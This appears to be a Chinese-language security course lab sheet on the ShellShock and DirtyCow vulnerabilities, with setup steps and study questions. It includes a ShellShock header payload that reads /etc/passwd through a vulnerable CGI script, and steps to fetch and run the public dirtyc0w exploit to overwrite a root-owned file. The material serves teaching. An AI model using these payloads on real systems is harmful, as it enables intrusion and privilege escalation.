# Lab 5 Linux DirtyCow and ShellShock

## ShellShock
CVE-2014-6271 https://shellshocker.net/
> 描述引用来源：[https://en.wikipedia.org/wiki/Shellshock_(software_bug)](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
> 2014年9月24日bash被公布存在远程代码执行漏洞，漏洞会影响目前主流的操作系统平台，包括但不限于Redhat、CentOS、Ubuntu、Debian、Fedora 、Amazon Linux 、OS X 10.10等平台，此漏洞目前虽然有部分系统给出了补丁，但因为漏洞修补的时效性，及漏洞的范围之大，且还存在一些没有发布补丁的问题，所以仍被定义为高危漏洞。
> bash引自维基百科的描述为：＂bash，Unix shell的一种。1989年发布第一个正式版本，原先是计划用在GNU操作系统上，但能运行于大多数类Unix系统的操作系统之上，包括Linux与Mac OS X v10.4都将它作为默认shell。它也被移植到Microsoft Windows上的Cygwin与MinGW。

当apache使用CGI处理HTTP请求时，它会将请求中的某些信息复制到环境变量列表中，然后将请求转发给处理程序。 如果处理程序是一个Bash脚本，或者如果它使用syscall执行某个脚本，Bash将接收由服务器传递的环境变量，并按上述方式处理它们。 这就提供了一种通过构造HTTP请求来触发ShellShock漏洞的场景。

### 环境搭建
下载并编译存在漏洞版本的bash
```bash
# Please ensure to run the following command with root privilege.
apt update && apt -y install wget build-essential bison autoconf
mkdir -p /usr/local/src/cve-2014-6271 
wget -qO- https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz | tar zx -C /usr/local/src/cve-2014-6271 --strip-components=1
cd /usr/local/src/cve-2014-6271 && ./configure --prefix=/usr/local/bash-4.3.0
make && make install
rm -rf /usr/local/src/cve-2014-6271

# Install apache2 and enable CGI mod for your Linux.
apt install apache2 && a2enmod cgi
cp ./safe.cgi ./vuln.cgi /usr/lib/cgi-bin
systemctl start apache2.service
```

在我们的`vuln.cgi`和`safe.cgi`中分别是使用未修复和已修复ShellShock的bash。

我们分别使用curl 访问如下两个CGI的页面

```bash
curl http://127.0.0.1/cgi-bin/vuln.cgi
curl http://127.0.0.1/cgi-bin/safe.cgi
```

如果返回类似如下的结果，说明环境配置成功

```bash
$ curl 127.0.0.1/cgi-bin/vuln.cgi
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 146
Content-Type: text/html
Date: Sun, 27 May 2018 18:05:42 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.33 (Debian)
Vary: Accept-Encoding

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Bash ShellShock</title>
</head>
<body>
<p>
Hello world
</p>
</body>
</html>
```

Q1:使用如下命令访问vuln.cgi所在的页面，查看response。

```bash
curl -H 'x: () { :;};a=`/bin/cat /etc/passwd`;echo $a' http://127.0.0.1/cgi-bin/vuln.cgi -I
```

Q2:尝试解释Q1中PoC。

Q3:还有没有其他场景可能会导致ShellShock漏洞，讨论ShellShock产生的原因。




## DirtyCow
CVE-2016-5195 https://dirtycow.ninja/

> 描述引用来源：https://github.com/dirtycow 
> A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.
> Linux内核的内存子系统在处理copy-on-write（COW）时出现竞争条件，导致私有只读存储器映射被破坏。
> The bug has existed since around 2.6.22 (released in 2007) and was fixed on Oct 18, 2016. 
> 这个bug自Linux 2.6.22(发布于 2007 年)存在至今，并于2016年10月18日被修复。

从描述中，我们可以了解到这是一个存在于内核的条件竞争的漏洞，因此我们可以尝试利用这个漏洞来达到提权的目的。

首先请检查你的实验环境的内核版本

```bash
uname -a
Linux ubuntu 3.13.0-96-generic #143-Ubuntu SMP Mon Aug 29 20:15:20 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```
接下来创建一个只有root可读写，而低权限只能读不能写的文件

```bash
test@ubuntu:~$ echo ABCDEFGHIJKLMN > target.txt
test@ubuntu:~$ cat target.txt 
ABCDEFGHIJKLMN
test@ubuntu:~$ chmod 644 target.txt
test@ubuntu:~$ sudo chown root:root target.txt
test@ubuntu:~$ ls -al target.txt 19 May 28 22:03
```

此时，当你尝试用低权限账户去改写该文件时，会发现返回Permission denied
```bash
test@ubuntu:~$ echo aaaaaaaaa > target.txt
bash: target.txt: Permission denied
```

编译利用代码

```bash
test@ubuntu:~$ wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
test@ubuntu:~$ gcc -pthread dirtyc0w.c -o dirtyc0w
```

执行dirtyc0w, 你会发现文件成功被修改

```bash
test@ubuntu:~$ ./dirtyc0w target.txt abcdefghijklmn
test@ubuntu:~$ cat target.txt
abcdefghijklmn
```

Q1: 复现DirtyCow的利用过程
Q2: 该漏洞可能造成哪些影响
Q3: 如果你作为一家公司的运维，当该漏洞被纰漏并且Linux内核还未修复该漏洞，你该如何加固你的服务器？
